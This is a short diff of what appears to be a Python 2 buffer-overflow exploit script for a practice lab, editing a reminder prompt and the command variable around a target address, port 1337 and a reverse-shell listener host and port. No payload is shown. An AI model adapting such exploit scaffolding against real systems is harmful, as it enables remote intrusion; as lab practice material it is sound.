@@ -12,8 +12,8 @@ timeout = 5
 
 addr = ('10.10.177.32',1337)
 
-reminder = raw_input ("Remember to change addr (target)  and lhost/lport"
-cmd = raw_input("Enter cmd name, such as 'OVERFLOW6' ")
+reminder = raw_input ("Remember to change addr (target), lhost/lport, and cmd")
+cmd = ""
 
 lhost = "10.4.11.217"
 lport = "4444"
